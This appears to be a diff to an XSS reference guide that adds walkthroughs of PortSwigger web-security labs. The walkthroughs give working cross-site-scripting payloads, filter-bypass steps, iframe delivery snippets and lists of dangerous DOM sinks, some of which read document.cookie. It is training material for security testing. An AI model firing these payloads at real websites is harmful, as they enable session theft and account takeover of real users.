@@ -144,6 +144,124 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 - Impact statement in concrete terms: what the attacker reads or does with the victim's session. State the CSP and cookie flags (`HttpOnly`, `SameSite`) — they change severity.
 - One short remediation note (context-aware output encoding; for DOM, use `textContent`/sanitizers) — reviewers appreciate it but it is not the payload.
 
+## Lab walkthroughs (PortSwigger XSS labs)
+
+Worked examples for identifying the exact XSS context. The repeating process: inject a canary → find it in the response/DOM → determine the context → pick the breakout for that context.
+
+### HTML context with tag/attribute filters
+
+**Reflected XSS into HTML context with most tags and attributes blocked**
+1. `<script>alert(1)</script>` → "tags are not allowed"
+2. Inject `<>` → reflected as "no result for <>", so *some* tags are allowed
+3. Brute-force tags with Burp: `?search=<$$>` using PortSwigger's tag list → `<body>` allowed
+4. `<body onload='alert(1)'>` → "attributes are not allowed"
+5. Brute-force events: `?search=<body%20$$>` using PortSwigger's event list → `onresize` allowed
+6. `<body onresize='alert(1)'>` fires when the page resizes — deliver with `print()`:
+```html
+<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+**Reflected XSS with some SVG markup allowed**
+1. `<script>alert(3)</script>` → "tags are not allowed"
+2. Brute-force tags → `svg` allowed; brute-force events → `onbegin` allowed
+3. Payload: `<svg><animateTransform onbegin="alert(1)">`
+
+**Reflected XSS into HTML context with all tags blocked except custom ones**
+1. Standard tags and events all blocked — but custom tags still work
+2. Payload: `<custom-tag onmouseover=alert(1)>`
+3. To deliver to the victim:
+```html
+<script>location = 'https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
+```
+
+**Stored DOM XSS (comment box)**
+1. `<h1>hello</h1>` renders, but the second tag gets stripped
+2. Nest the tags so stripping leaves one behind: `<h1><img src=1 onerror=alert(1)>`
+
+### DOM sinks (client-side)
+
+**DOM XSS in document.write sink using source location.search**
+1. Search `hello`, inspect the source: `document.write('<img src="...tracker.gif?searchTerms='+query+'">')` — input lands inside a JS string inside a write
+2. Payload: `"><script>alert(1)</script>`
+
+**DOM XSS in document.write sink inside a select element**
+1. Selecting a store renders `<select name="storeId">...` from the URL
+2. Inject in the URL: `?productId=1&storeId=London"><script>alert(1)</script>`
+
+**DOM XSS in jQuery anchor href sink using location.search source**
+1. Feedback page source: `$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));`
+2. Input is the `returnPath` param → `?returnPath=javascript:alert(document.cookie)`
+
+**DOM XSS in jQuery selector sink using a hashchange event**
+1. Source: `$(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); ...`
+2. Everything after `#` runs as a jQuery selector: `/#<img src=x onerror='alert(1)'>`
+3. Deliver with `print()`:
+```html
+<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+
+**DOM XSS in AngularJS expression (angle brackets and double quotes HTML-encoded)**
+1. The search box renders AngularJS expressions (`{{hello}}` echoes back)
+2. Payload: `{{constructor.constructor('alert(1)')()}}`
+
+**Reflected DOM XSS (eval on JSON response)**
+1. Response is JSON: `{"results":[],"searchTerm":"hello"}` and the app evals it
+2. Payload: `hello/"-alert(1)}//` → response becomes `{"results":[],"searchTerm":"hello\\"-alert(1)}//"}`
+   - `/"` escapes the JSON string quote; `//` comments out the code behind
+
+**Main sinks that can lead to DOM XSS:**
+```
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+```
+
+**jQuery functions that can lead to XSS:**
+```
+add()  after()  append()  animate()  insertAfter()  insertBefore()
+before()  html()  prepend()  replaceAll()  replaceWith()  wrap()
+wrapInner()  wrapAll()  has()  constructor()  init()  index()
+jQuery.parseHTML()  $.parseHTML()
+```
+
+### Attribute & JavaScript-string contexts
+
+**Stored XSS into anchor href attribute (double quotes HTML-encoded)**
+1. The website field becomes `<a id="author" href="fake.com">fake</a>` — full control of `href`
+2. Payload in the website field: `javascript:alert(1)`
+
+**Reflected XSS in canonical link tag**
+1. Input appears in `<link rel="canonical" href="https://LAB-ID.web-security-academy.net/post?postId=2">`
+2. Inject access key + event: `https://LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(2)`
+3. Result: `<link rel="canonical" href="https://LAB-ID.../?" accesskey="x" onclick="alert(2)">`
+4. Triggers on keyboard shortcut — Linux/Windows `Alt+Shift+X`, macOS `Ctrl+Alt+X`
+
+**Reflected XSS into a JavaScript string (angle brackets and double quotes HTML-encoded, single quotes escaped)**
+1. `'` becomes `\'`
+2. Payload `\';alert(document.domain)//` — your backslash eats the server's escape backslash: `\\';alert(document.domain)//`
+
+**Stored XSS into onclick event (angle brackets and double quotes HTML-encoded, single quotes and backslash escaped)**
+1. Website lands in `onclick="var tracker={track(){}};tracker.track('URL');"` and `'` becomes `\'`
+2. HTML-encode the quote so the browser decodes it *after* the server-side escaping: `http://foo?&apos;-alert(1)-&apos;`
+3. Result: `<a ... onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">`
+
+**Reflected XSS into a template literal (angle brackets, single/double quotes, backslash and backticks Unicode-escaped)**
+1. Input lands inside backticks: `` `0 search results for 'hello'` ``
+2. Template literals execute `${...}` expressions: `${alert(1)}`
+
+**Reflected XSS into a JavaScript string (single quote and backslash escaped)**
+1. `var searchTerms = 'hello';` — quotes are escaped but the `<script>` block isn't
+2. Break out of the script block: `hello'</script><img src=x onerror=alert(document.cookie)>`
+   - Also works: `</script><script>alert(2)</script>`
+
+**Reflected XSS into a JavaScript string (angle brackets HTML encoded)**
+1. `var searchTerms = ''hello'';` — nothing is escaped
+2. Close and reopen the string: `'-alert(1)-'`
+
 ## References
 
 - [PortSwigger Web Security Academy — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
